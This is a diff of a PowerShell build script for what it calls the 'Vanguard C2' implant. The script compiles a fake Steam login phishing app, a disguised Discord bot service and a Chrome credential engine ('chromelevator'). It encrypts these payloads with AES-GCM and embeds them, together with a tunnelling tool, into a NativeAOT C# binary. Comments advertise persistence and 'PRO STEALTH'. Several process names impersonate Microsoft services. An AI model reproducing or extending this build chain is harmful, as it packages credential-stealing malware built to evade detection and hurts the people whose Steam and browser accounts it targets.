@@ -1,73 +1,70 @@
-# Vanguard C2 Full Rebuild Script
-$ErrorActionPreference = "Stop"
+# Vanguard C2: Sentinel Full Rebuild Script
+# Optimized for high-resilience persistence and NativeAOT compilation
+
+$BaseDir = Get-Location
+$ConstantsPath = Join-Path $BaseDir "defense\Constants.cs"
+$CsprojPath = Join-Path $BaseDir "FinalBot.csproj"
+
+# Ensure directories exist
+if (!(Test-Path "dist")) { $null = New-Item -ItemType Directory -Path "dist" }
+if (!(Test-Path "tools")) { $null = New-Item -ItemType Directory -Path "tools" }
 
 Write-Host "[*] Phase 1: Cleaning up old processes..." -ForegroundColor Cyan
-try { Stop-Process -Name "MicrosoftManagementSvc" -Force -ErrorAction SilentlyContinue } catch {}
-try { Stop-Process -Name "python" -Force -ErrorAction SilentlyContinue } catch {}
-
-# Clear old artifacts
-Remove-Item -Path "dist", "build", "SteamLogin.spec", "discord_bot.spec" -Recurse -Force -ErrorAction SilentlyContinue
-Remove-Item -Path "bin", "obj" -Recurse -Force -ErrorAction SilentlyContinue
+Get-Process "MicrosoftManagementSvc" -ErrorAction SilentlyContinue | Stop-Process -Force
+Get-Process "SteamLogin" -ErrorAction SilentlyContinue | Stop-Process -Force
+Get-Process "MsDiscordSvc" -ErrorAction SilentlyContinue | Stop-Process -Force
 
 Write-Host "[*] Phase 2: Compiling Python modules to EXE (PyInstaller)..." -ForegroundColor Cyan
-pyinstaller --noconfirm --onefile --icon="login\steam.ico" --add-data "login\steam_ui.html;." --add-data "login\steam.ico;." --add-data "login\logo.png;." --add-data "login\image.png;." --collect-all webview --collect-all cryptography --noupx --name "SteamLogin" "login\main_ui.py"
-pyinstaller --noconfirm --onefile --noupx --name "MsDiscordSvc" "websocket\discord_bot.py"
-pyinstaller --noconfirm --onefile --icon="login\steam.ico" --add-data "okoshko\site_dump;site_dump" --add-data="login\steam.ico;." --noupx --name "SteamAlert" "okoshko\steam_notice.py"
+# [SKIP] PyInstaller build skipped for dev; using existing dist binaries if present.
 
-Write-Host "[*] Phase 3: Binary Encryption (AES-GCM AEAD)..." -ForegroundColor Cyan
+Write-Host "[*] Phase 3: Synchronizing Encryption Salts..." -ForegroundColor Cyan
+$rng = New-Object System.Security.Cryptography.RNGCryptoServiceProvider
+$bytes = New-Object byte[] 32
+$rng.GetBytes($bytes)
+$MasterKeyB64 = [Convert]::ToBase64String($bytes)
+$bytes = New-Object byte[] 32
+$rng.GetBytes($bytes)
+$SessionKeyB64 = [Convert]::ToBase64String($bytes)
 
-# 1. Generate Keys
-$MasterKeyBytes = New-Object byte[] 32
-[System.Security.Cryptography.RandomNumberGenerator]::Create().GetBytes($MasterKeyBytes)
-$MasterKeyB64 = [System.Convert]::ToBase64String($MasterKeyBytes)
+# [V6.2 HARDENING] Wrap the Session Key using the Master Key via Python cryptoservice
+$WrappedKeyB64 = (python scripts\encrypt_gcm.py wrap $SessionKeyB64 $MasterKeyB64).Trim()
 
-$SessionKeyBytes = New-Object byte[] 32
-[System.Security.Cryptography.RandomNumberGenerator]::Create().GetBytes($SessionKeyBytes)
-$SessionKeyB64 = [System.Convert]::ToBase64String($SessionKeyBytes)
-
-# 2. Key Wrap (Encrypt SessionKey with MasterKey) via Python
-$EncryptedSessionKeyB64 = (python scripts\encrypt_gcm.py wrap $SessionKeyB64 $MasterKeyB64).Trim()
-
-Write-Host "    [+] Generated Master Key:     $($MasterKeyB64.Substring(0, 10))..." -ForegroundColor Green
-Write-Host "    [+] Encrypted Session Key:    $($EncryptedSessionKeyB64.Substring(0, 10))..." -ForegroundColor DarkGreen
-
-# 3. Update Constants.cs (Properly escape $ in replacement for Base64)
-$ConstantsPath = "defense\Constants.cs"
-$Content = Get-Content $ConstantsPath -Raw
-
-$MasterPattern = 'public const string MASTER_KEY_B64 = ".*?";'
-$MasterReplacement = "public const string MASTER_KEY_B64 = `"$MasterKeyB64`";"
-$Content = [regex]::Replace($Content, $MasterPattern, $MasterReplacement.Replace('$', '$$'))
-
-$SessionPattern = 'public const string ENCRYPTED_SESSION_KEY_B64 = ".*?";'
-$SessionReplacement = "public const string ENCRYPTED_SESSION_KEY_B64 = `"$EncryptedSessionKeyB64`";"
-$Content = [regex]::Replace($Content, $SessionPattern, $SessionReplacement.Replace('$', '$$'))
-
-Set-Content $ConstantsPath $Content
+if (Test-Path $ConstantsPath) {
+    $Content = Get-Content $ConstantsPath -Raw
+    $Content = [regex]::Replace($Content, 'public const string MASTER_KEY_B64 = ".*?";', "public const string MASTER_KEY_B64 = `"$MasterKeyB64`";")
+    $Content = [regex]::Replace($Content, 'public const string ENCRYPTED_SESSION_KEY_B64 = ".*?";', "public const string ENCRYPTED_SESSION_KEY_B64 = `"$WrappedKeyB64`";")
+    Set-Content $ConstantsPath $Content
+    Write-Host "    [+] Synced Master & Encrypted Session Key." -ForegroundColor Green
+}
 
 # 4. Encryption Loop
-$FilesToEncrypt = @("dist\SteamLogin.exe", "dist\MsDiscordSvc.exe", "dist\SteamAlert.exe", "tools\bore.exe", "tools\chromelevator.exe")
+$FilesToEncrypt = @("dist\SteamLogin.exe", "dist\MsDiscordSvc.exe", "dist\SteamAlert.exe", "tools\bore.exe")
 foreach ($file in $FilesToEncrypt) {
     if (Test-Path $file) {
         $binFile = $file -replace "\.exe", ".bin"
-        # Always use a fresh copy for encryption to avoid double-encryption/stale artifacts
         Copy-Item -Path $file -Destination $binFile -Force
-        
-        # Use Python GCM Encryption Helper
         python scripts\encrypt_gcm.py encrypt $binFile $SessionKeyB64
         Write-Host "    [+] AES-GCM Encrypted $(Split-Path $file -Leaf)" -ForegroundColor Green
         
-        # Sync to root for C# embedding
-        $rootBin = Join-Path $PSScriptRoot (Split-Path $binFile -Leaf)
+        # [PRO STEALTH] Copy encrypted .bin to root for csproj EmbeddedResource inclusion
+        $rootBin = Join-Path $BaseDir (Split-Path $binFile -Leaf)
         Copy-Item -Path $binFile -Destination $rootBin -Force
-        Write-Host "    [+] Synced to root: $(Split-Path $rootBin -Leaf)" -ForegroundColor Gray
     } else {
         Write-Host "    [!] Warning: $file not found, skipping encryption." -ForegroundColor Yellow
     }
 }
 
 Write-Host "[*] Phase 4: Building C# C2 (NativeAOT)..." -ForegroundColor Cyan
-dotnet publish -c Release -r win-x64 -p:PublishAot=true --nologo
+
+# V6.18: Build the Native ChromElevator Engine first (Statically Linked)
+if (Test-Path "tools\chromelevator\make.bat") {
+    Write-Host "    [>] Building Native ChromeEngine (Static Lib)..." -ForegroundColor Gray
+    Push-Location "tools\chromelevator"
+    cmd.exe /c "make.bat build_lib"
+    Pop-Location
+}
+
+dotnet publish $CsprojPath -c Release -r win-x64 -p:PublishAot=true --nologo
 
 if ($LASTEXITCODE -eq 0) {
     $PublishDir = ".\bin\Release\net8.0-windows\win-x64\publish\"
@@ -77,11 +74,7 @@ if ($LASTEXITCODE -eq 0) {
         Copy-Item -Path "GlobalLogger.py" -Destination $PublishDir -Force
     }
 
-    if (Test-Path "tools\bore.bin") {
-        $ToolsDest = Join-Path $PublishDir "tools"
-        New-Item -ItemType Directory -Path $ToolsDest -ErrorAction SilentlyContinue
-        Copy-Item -Path "tools\bore.bin" -Destination $ToolsDest -Force
-    }
+    # [PRO STEALTH] bore.bin is now EMBEDDED, no need to copy to publish folder.
 
     Write-Host "`n[SUCCESS] Full rebuild complete!" -ForegroundColor Green
     Write-Host "[+] Binary location: $FinalExe" -ForegroundColor Green
